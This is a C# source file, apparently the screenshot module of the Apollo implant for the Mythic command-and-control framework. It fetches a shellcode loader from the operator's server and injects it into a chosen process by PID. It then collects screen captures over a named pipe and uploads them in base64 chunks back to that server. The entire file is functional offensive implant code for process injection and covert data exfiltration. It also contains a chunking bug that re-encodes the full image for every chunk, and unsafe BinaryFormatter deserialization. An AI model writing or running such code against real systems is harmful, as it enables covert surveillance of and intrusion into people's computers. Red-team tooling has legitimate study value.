#define COMMAND_NAME_UPPER

#if DEBUG
#undef SCREENSHOT
#define SCREENSHOT
#endif

#if SCREENSHOT
using Newtonsoft.Json;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Mythic.Structs;
using Apollo.Tasks;
using Apollo.Jobs;
using Apollo.MessageInbox;
using Newtonsoft.Json.Linq;
using System.IO.Pipes;
using IPC;
using System.Runtime.Serialization.Formatters.Binary;
using System.Collections.Generic;

/// <summary>
/// This task will inject into another process and capture screenshots from all screens and upload it to the Apfell server.
/// Author: @reznok
/// </summary>
namespace Apollo.CommandModules
{
    public class Screenshot
    {
        /// <summary>
        /// Capture the screen associated with the current
        /// desktop session.
        /// </summary>
        /// <param name="job">Job associated with this task.</param>
        /// <param name="implant">Agent associated with this task.</param>
        public static void Execute(Job job, Agent agent)
        {
            Task task = job.Task;
            JObject json = (JObject)JsonConvert.DeserializeObject(task.parameters);

            string loaderStubID;
            byte[] loaderStub;
            string pipeName;
            int pid = -1;

            List<ScreenshotMessage> receivedScreenshotMessages = new List<ScreenshotMessage>();

            ////
            // Parameter Checks
            ////

            loaderStubID = json.Value<string>("loader_stub_id");
            // Reset the loader stub each time as a new named pipe is given to us from on high.
            loaderStub = null;
            loaderStub = agent.Profile.GetFile(task.id, loaderStubID, agent.Profile.ChunkSize);
            if (loaderStub == null || loaderStub.Length == 0)
            {
                job.SetError(String.Format("Unable to retrieve assembly loader shellcode stub with ID {0}", loaderStubID));
                return;
            }

            pipeName = json.Value<string>("pipe_name");
            if (pipeName == "")
            {
                job.SetError("No pipe name was given to connect to (server error).");
                return;
            }

            pid = json.Value<int>("pid");

            if (pid < 0)
            {
                job.SetError("Invalid PID given (pid < 0).");
                return;
            }

            try
            {
                var temp = System.Diagnostics.Process.GetProcessById(pid);
            }
            catch (Exception ex)
            {
                job.SetError($"Failed to get process with pid {pid}. Reason: {ex.Message}");
                return;
            }
              

            ////
            //  Execution
            ////
            
            try
            {

                ApolloTaskResponse response;
                var injectionType = Injection.InjectionTechnique.GetInjectionTechnique();
                var injectionHandler = (Injection.InjectionTechnique)Activator.CreateInstance(injectionType, new object[] { loaderStub, (uint)pid });

                if (injectionHandler.Inject())
                {

                    NamedPipeClientStream pipeClient = new NamedPipeClientStream(pipeName);
                    pipeClient.Connect(30000);

                    // Number of screenshots to be received is unknown. Keep processing screenshot messages until a termination message is received by the server.
                    bool terminationReceived = false;
                    while (!terminationReceived)
                    {

                        try
                        {
                            var screenShotMessage = ReadScreenshotMessage(pipeClient);

                            // Handle messages that contain screenshot information
                            if (screenShotMessage.GetType() == typeof(ScreenshotMessage))
                            {
                                Console.WriteLine($"Received Screenshot!");
                                receivedScreenshotMessages.Add((ScreenshotMessage)screenShotMessage);
                            }

                            else if (screenShotMessage.GetType() == typeof(ScreenshotTerminationMessage))
                            {
                                Console.WriteLine("Received Termination");
                                terminationReceived = true;
                                pipeClient.Close();
                            }

                            else
                            {
                                string error = "Received unexpected object type from Screenshot.ReadScreenshotMessage()";
                                Console.WriteLine(error);
                                job.SetError(error);
                                pipeClient.Close();
                                return;
                            }

                        }

                        catch (Exception e)
                        {
                            pipeClient.Close();
                            string error = $"Error deserializing screenshots received over pipe: {e.ToString()}";
                            Console.WriteLine(error);
                            job.SetError(error);
                            return;
                        }
                    }



                    if (receivedScreenshotMessages == null || receivedScreenshotMessages.Count == 0)
                    {
                        job.SetError("Task executed successfully, but 0 Screenshots Were Returned");
                        return;
                    }

                    try
                    {
                        foreach (ScreenshotMessage screenShotMsg in receivedScreenshotMessages)
                        {
                            if (screenShotMsg.ErrorMessage != null)
                            {
                                job.SetError(screenShotMsg.ErrorMessage);
                                return;
                            }

                            SendCapture(agent, job, screenShotMsg.Capture);
                        }
                    }

                    catch
                    {
                        job.SetError("Failed to send screenshots to server.");
                        return;
                    }

                    job.SetComplete();

                }
            }

            catch
            {
                job.SetError("Failed to inject into process");
            }
        }

        private static object ReadScreenshotMessage(NamedPipeClientStream pipeClient)
        {
            BinaryFormatter bf = new BinaryFormatter();
            bf.Binder = new ScreenshotMessageBinder();
            object message = bf.Deserialize(pipeClient);
            return message;
        }

        /// <summary>
        /// Send a chunked screenshot response to the Apfell server.
        /// </summary>
        /// <param name="implant">Agent that will be sending the data.</param>
        /// <param name="task">Task associated with the screenshot.</param>
        /// <param name="screenshot">Byte array of data that holds a chunked screenshot response.</param>
        private static void SendCapture(Agent implant, Job job, byte[] screenshot)
        {
            Task task = job.Task;
            try // Try block for HTTP request
            {
                // Send total number of chunks to Apfell server
                // Number of chunks will always be one for screen capture task
                // Receive file ID in response
                // Send number of chunks associated with task to Apfell server
                // Response will have the file ID to send file with

                int totalChunks = (int)Math.Ceiling((double)screenshot.Length / (double)implant.Profile.ChunkSize);
                ApolloTaskResponse registrationMessage = new ApolloTaskResponse()
                {
                    task_id = task.id,
                    total_chunks = totalChunks,
                    full_path = task.id
                };
                //SCTaskResp initial = new SCTaskResp(task.id, "{\"total_chunks\": " + total_chunks + ", \"task\": \"" + task.id + "\"}");
                job.AddOutput(registrationMessage);
                MythicTaskResponse resp = (MythicTaskResponse)Inbox.GetMessage(task.id);
                if (resp.file_id == "")
                {
                    job.SetError(String.Format("Did not parse a file_id from the server response. Server reply was: {0}", resp.ToString()));
                    return;
                }
                // Convert chunk to base64 blob and create our FileChunk
                for (int i = 0; i < totalChunks; i++)
                {
                    ApolloTaskResponse fc = new ApolloTaskResponse();
                    fc.chunk_num = i+1;
                    fc.file_id = resp.file_id;
                    fc.total_chunks = -1;
                    byte[] screenshotChunk = new byte[implant.Profile.ChunkSize];
                    if (implant.Profile.ChunkSize > screenshot.Length - (i * implant.Profile.ChunkSize))
                        Array.Copy(screenshot, i * implant.Profile.ChunkSize, screenshotChunk, 0, screenshot.Length - (i * implant.Profile.ChunkSize));
                    else
                        Array.Copy(screenshot, i * implant.Profile.ChunkSize, screenshotChunk, 0, implant.Profile.ChunkSize);
                    fc.chunk_data = Convert.ToBase64String(screenshot);
                    fc.task_id = task.id;

                    job.AddOutput(fc);
                    Inbox.GetMessage(task.id);
                    //Debug.WriteLine($"[-] SendCapture - RESPONSE: {implant.Profile.SendResponse(response)}");
                }
            }
            catch (Exception e) // Catch exceptions from HTTP requests
            {
                // Something failed, so we need to tell the server about it
                job.SetError($"Error: {e.Message}");
            }
        }
    }
}
#endif